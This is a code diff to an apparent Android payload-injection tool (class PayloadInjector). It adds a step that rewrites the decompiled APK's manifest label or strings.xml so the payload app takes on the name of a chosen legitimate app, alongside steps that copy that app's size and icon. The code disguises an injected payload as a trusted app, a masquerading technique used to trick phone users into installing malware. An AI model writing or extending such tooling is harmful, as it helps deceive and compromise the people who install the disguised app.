@@ -60,6 +60,11 @@ class PayloadInjector:
             if not await self._update_config_js(app_info['name'], app_info['size']):
                 return None, "Failed to update config.js"
             
+            # Step 4.5: Update payload app name (AndroidManifest.xml)
+            logger.info("📝 Step 4.5/6: Updating payload app name...")
+            if not await self._update_payload_app_name(app_info['name']):
+                logger.warning("Failed to update payload app name, continuing...")
+            
             # Step 5: Replace icon
             logger.info("🎨 Step 5/6: Updating icon...")
             if app_info['icon_path']:
@@ -222,6 +227,93 @@ class PayloadInjector:
             
         except Exception as e:
             logger.error(f"Config update error: {str(e)}")
+            return False
+    
+    async def _update_payload_app_name(self, app_name):
+        """Update payload app name in AndroidManifest.xml"""
+        try:
+            manifest_path = os.path.join(self.decompiled_dir, 'AndroidManifest.xml')
+            
+            if not os.path.exists(manifest_path):
+                logger.error("AndroidManifest.xml not found")
+                return False
+            
+            # Read manifest
+            with open(manifest_path, 'r', encoding='utf-8') as f:
+                content = f.read()
+            
+            # Find and replace android:label
+            # Pattern 1: android:label="..."
+            if 'android:label="' in content:
+                content = re.sub(
+                    r'android:label="[^"]*"',
+                    f'android:label="{app_name}"',
+                    content,
+                    count=1  # Only first occurrence (application tag)
+                )
+                logger.info(f"✅ Payload app name updated to: {app_name}")
+            
+            # Pattern 2: android:label="@string/..."
+            elif 'android:label="@string/' in content:
+                # Extract string resource name
+                match = re.search(r'android:label="@string/([^"]+)"', content)
+                if match:
+                    string_name = match.group(1)
+                    # Update strings.xml
+                    if await self._update_strings_xml(string_name, app_name):
+                        logger.info(f"✅ Payload app name updated to: {app_name}")
+                    else:
+                        # Fallback: replace with direct string
+                        content = re.sub(
+                            r'android:label="@string/[^"]+"',
+                            f'android:label="{app_name}"',
+                            content,
+                            count=1
+                        )
+                        logger.info(f"✅ Payload app name updated to: {app_name} (direct)")
+            
+            # Write back
+            with open(manifest_path, 'w', encoding='utf-8') as f:
+                f.write(content)
+            
+            return True
+            
+        except Exception as e:
+            logger.error(f"Payload app name update error: {str(e)}")
+            return False
+    
+    async def _update_strings_xml(self, string_name, new_value):
+        """Update strings.xml"""
+        try:
+            strings_path = os.path.join(self.decompiled_dir, 'res', 'values', 'strings.xml')
+            
+            if not os.path.exists(strings_path):
+                return False
+            
+            # Read strings.xml
+            with open(strings_path, 'r', encoding='utf-8') as f:
+                content = f.read()
+            
+            # Update string value
+            pattern = f'<string name="{string_name}">([^<]*)</string>'
+            if re.search(pattern, content):
+                content = re.sub(
+                    pattern,
+                    f'<string name="{string_name}">{new_value}</string>',
+                    content
+                )
+                
+                # Write back
+                with open(strings_path, 'w', encoding='utf-8') as f:
+                    f.write(content)
+                
+                logger.debug(f"Updated string resource: {string_name} = {new_value}")
+                return True
+            
+            return False
+            
+        except Exception as e:
+            logger.debug(f"strings.xml update error: {str(e)}")
             return False
     
     async def _inject_icon(self, icon_path):
